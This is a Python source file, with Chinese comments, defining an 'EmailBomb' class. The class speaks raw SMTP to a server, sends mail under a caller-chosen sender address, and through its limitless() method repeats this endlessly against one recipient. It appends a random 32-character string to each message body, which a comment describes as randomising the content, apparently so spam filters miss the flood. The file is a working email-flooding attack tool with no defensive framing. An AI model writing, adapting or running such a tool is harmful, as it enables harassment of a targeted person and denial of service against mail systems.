# -*- coding: utf-8 -*-
import Email
import random
import string
import time


class EmailBomb:
    def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.status_header = "No.{}: ".format(id)
        self.status_body = "creating..."
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
        self.exit_flag = 1  # ctrl+c 或主线程退出时，exit_flag 为 0

        self.update_status("")
        self.create()

    def update_status(self, body):
        '''
        保存状态
        '''

        self.status_body = body
        self.status = self.status_header+self.status_body

    def create(self):
        self.emailer = Email.Email(
            to_addr=self.to_addr,
            from_addr=self.from_addr,
            SMTP_addrs=self.SMTP_addrs,
            port=self.port,
            timeout=self.timeout,
        )

    def limitless(self, subject, content):
        while self.exit_flag:
            self.attack(subject, content)

    def attack(self, subject, content):
        '''
        攻击启动
        '''

        # 建立连接
        while self.exit_flag:
            code, msg = self.emailer.Connect()
            if code:
                # 建立会话
                self.status = "send ehlo"
                code, msg = self.emailer.Send(u"ehlo antispam")
                if code:
                    break

        self.update_status("send mail from")
        while self.exit_flag:
            # 表明发件地址
            code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
            if not code:
                continue

            self.update_status("send rcpt to")
            # 表明收件地址
            code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
            if code:
                break

            self.update_status(msg)

        self.update_status("send data")
        while self.exit_flag:
            # 信件具体内容
            code, msg = self.emailer.Send(u"data")
            if code:
                break

            self.update_status(msg)

        self.update_status("send to")
        while self.exit_flag:
            # to:
            code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
            if not code:
                self.update_status(msg)
                continue

            # from:
            self.update_status("send from")
            code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
            if not code:
                self.update_status(msg)
                continue

            # subject:
            self.update_status("send subject")
            code, msg = self.emailer.Send("subject: "+subject, recv=False)
            if not code:
                self.update_status(msg)
                continue

            break  # 上面都发送成功的话，就 break

        # body:
        self.update_status("send body")
        code, msg = self.emailer.Send(
            content+u"\r\n\r\n你的专属链接为："+"".join(
                random.choice(string.hexdigits)
                for i in range(32)
            )+"\r\n.\r\n",  # 随机化部分邮件内容

            check="250"  # 状态码为 250 说明发送成功
        )

        self.update_status(msg)
        time.sleep(1)
